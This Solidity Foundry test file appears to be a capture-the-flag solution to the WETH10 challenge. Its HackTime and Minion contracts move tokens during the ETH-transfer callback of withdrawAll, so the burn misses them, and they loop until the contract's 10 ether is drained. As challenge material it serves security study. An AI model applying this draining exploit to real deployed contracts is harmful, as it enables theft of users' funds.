// SPDX-License-Identifier: None
pragma solidity 0.8.7;

import { Test } from "forge-std/Test.sol";
import { WETH10 } from "../src/WETH.sol";

/**
 * @title   Answer to the WETH10 Challenge
 * @notice  Challenge isn't exactly clear on how the number of transactions is counted.
 *          This solution is not counting the deployment as one transaction (as it relies
 *          on a fallback, this can't be done with the constructor), fund retrieval is atomic tho.
 *          The idea is to exploit withdrawAll sequence of operations, in order to create a bookholding mismatch, based on:
 *           - the call to _burnAll happens after the ETH transfer (which can trigger additional logic)
 *           - the _burnAll relies on the sender token balance
 *           - a fallback triggered by the ETH transfer might implement a token transfer to a third address, burnAll will then
 *              "see" a balance of 0 token to burn.
 *           - this 3d address can then withdraw and send the eth to continue cycling this, until the contract is empty.
 * @dev     Not the most optmised contract, for better readiblity (usin an enum), avoiding reentrancy issues (check or unwanted iteration)
 * @author  DrGorilla.eth
 */

contract Weth10Test is Test {
    WETH10 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(address(weth).balance, 10 ether, "weth contract should have 10 ether");

        
        vm.startPrank(bob);

        // hack time!
        HackTime hack = new HackTime(weth); // Don't mind me, just a deployment
        address(hack).call{value: 1 ether}(""); // The transaction

        vm.stopPrank();
        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}

contract HackTime {
    // Target contract
    WETH10 immutable weth10;

    // Helper contract
    Minion immutable minion;

    // Track the current status, to not get lost in reentrancies
    enum State { Init, InWithdrawal, InCream }
    State currentState;

    // Nothing much here
    constructor(WETH10 _target) {
        weth10 = _target;
        minion = new Minion(_target);
        currentState = State.Init;
    }

    fallback() external payable {
        // Checked first to not revert on eth transfer from the helper
        if(currentState == State.InCream) {
            return;
        }

        // Initial call will land here, which will loop over the target ETH balance,
        // based on the amount of eth sent by the attacker
        if(currentState == State.Init) {
            uint256 _targetBalance = address(weth10).balance;
            uint256 _h4x0rBalance = msg.value;

            for(uint256 i; i < _targetBalance / _h4x0rBalance; i++) {
                    weth10.deposit{value: 1 ether}();
                    currentState = State.InWithdrawal;
                    weth10.withdrawAll();
                    currentState = State.InCream;
                    minion.CREAM();
            }
        }

        // Called back by weth10.withdraw eth transfer? Then move the token before the burnAll
        if(currentState == State.InWithdrawal) weth10.transfer(address(minion), weth10.balanceOf(address(this)));

        // Final case, we gather the eth and leave this - bye bye
        else payable(msg.sender).transfer(address(this).balance);
    }
}

contract Minion {
    // targetr
    WETH10 immutable weth10;

    constructor(WETH10 _weth10) {
        weth10 = _weth10;
    }

    /**
     * @dev will just call withdraw of this contract balance and send the eth to the caller
     */
    function CREAM() external {
        weth10.withdraw(weth10.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    // To receive some ETH
    fallback() external payable {}
}